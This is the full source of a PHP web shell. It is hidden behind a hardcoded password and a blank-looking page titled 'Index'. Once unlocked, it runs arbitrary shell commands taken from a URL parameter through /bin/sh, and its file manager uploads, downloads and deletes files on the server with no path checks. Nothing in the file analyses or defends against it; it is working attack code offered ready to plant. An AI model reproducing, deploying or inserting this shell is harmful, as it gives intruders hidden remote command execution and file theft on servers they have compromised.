<?php
error_reporting(0);
session_start();

$password = "wiredmouseis";   


if (!isset($_SESSION['auth'])) {
    if (isset($_POST['p']) && $_POST['p'] === $password) {
        $_SESSION['auth'] = true;
    } else {
        // Completely blank looking page
        die('
        <html>
        <head><title>Index</title>
        <style>
            body{background:#ffffff;color:#000;font-family:Arial,sans-serif;margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh;}
            input{background:#fff;border:1px solid #ccc;padding:12px;width:280px;font-size:16px;text-align:center;}
        </style>
        </head>
        <body>
            <form method="post">
                <input type="password" name="p" placeholder="Enter key" autofocus>
            </form>
        </body>
        </html>');
    }
}

// ====================== MAIN PANEL ======================
$dir = isset($_GET['d']) ? realpath($_GET['d']) : getcwd();
if (!is_dir($dir)) $dir = getcwd();
chdir($dir);

$cmd = $_GET['c'] ?? '';
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Index</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        body { background:#0a0a0a; color:#e0e0e0; font-family:Consolas, monospace; margin:0; padding:0; }
        .header { background:#111; padding:12px; display:flex; justify-content:space-between; align-items:center; }
        .path { color:#0f0; }
        table { width:100%; border-collapse:collapse; }
        th, td { padding:10px; border-bottom:1px solid #222; }
        tr:hover { background:#1a1a1a; }
        .folder { color:#4fc3f7; }
        .file { color:#81c784; }
        input[type=text] { width:70%; padding:10px; background:#111; border:1px solid #0f0; color:#0f0; }
        button { padding:10px 18px; background:#111; border:1px solid #0f0; color:#0f0; }
        .output { background:#000; padding:12px; margin:10px 0; white-space:pre-wrap; }
    </style>
</head>
<body>

<div class="header">
    <h3>Panel</h3>
    <a href="?logout=1" style="color:#f66;">Exit</a>
</div>

<div style="padding:15px;">

    <!-- Shell -->
    <h4>Command</h4>
    <form method="GET">
        <input type="text" name="c" placeholder="whoami || id || ls -la" autofocus>
        <button type="submit">Run</button>
    </form>

    <?php if($cmd): ?>
    <div class="output">
        <?=htmlspecialchars($cmd)?><br><br>
        <?php
        $out = '/tmp/o_'.rand(10000,99999).'.txt';
        if(function_exists('pcntl_fork') && function_exists('pcntl_exec')){
            $pid = pcntl_fork();
            if($pid == 0){
                pcntl_exec('/bin/sh', ['-c', $cmd . " > $out 2>&1"]);
                exit();
            }
            sleep(2);
        }
        $res = file_exists($out) ? file_get_contents($out) : '';
        @unlink($out);
        echo htmlspecialchars($res ?: "No output");
        ?>
    </div>
    <?php endif; ?>

    <!-- File Manager -->
    <h4>File Manager</h4>
    <div class="path">Path: <?=htmlspecialchars($dir)?></div>

    <form method="post" enctype="multipart/form-data" style="margin:10px 0;">
        <input type="file" name="ufile">
        <button type="submit">Upload</button>
    </form>

    <?php
    if(isset($_FILES['ufile'])){
        $target = $dir.'/'.$_FILES['ufile']['name'];
        echo move_uploaded_file($_FILES['ufile']['tmp_name'], $target) ? "<p style='color:lime;'>Uploaded</p>" : "<p style='color:red;'>Failed</p>";
    }

    if(isset($_GET['del'])){
        $p = $dir.'/'.$_GET['del'];
        if(is_file($p)) unlink($p);
        header("Location: ?d=".urlencode($dir));
        exit;
    }
    ?>

    <table>
        <tr><th>Name</th><th>Type</th><th>Action</th></tr>
        <?php
        foreach(scandir($dir) as $f){
            if($f=="." || $f=="..") continue;
            $full = $dir.'/'.$f;
            $isdir = is_dir($full);
            echo "<tr><td>";
            if($isdir){
                echo '<a href="?d='.urlencode($full).'" class="folder">📁 '.$f.'</a>';
            } else {
                echo '<a href="?d='.urlencode($dir).'&download='.urlencode($f).'" class="file">📄 '.$f.'</a>';
            }
            echo "</td><td>".($isdir?'Folder':'File')."</td>";
            echo "<td>".(!$isdir?'<a href="?del='.urlencode($f).'&d='.urlencode($dir).'" style="color:red;" onclick="return confirm(\'Delete?\')">Delete</a>':'')."</td></tr>";
        }
        ?>
    </table>
</div>

<?php
if(isset($_GET['download'])){
    $f = $dir.'/'.$_GET['download'];
    if(file_exists($f)){
        header('Content-Disposition: attachment; filename="'.basename($f).'"');
        readfile($f); exit;
    }
}
if(isset($_GET['logout'])){ session_destroy(); header("Location: ".$_SERVER['PHP_SELF']); }
?>
</body>
</html>
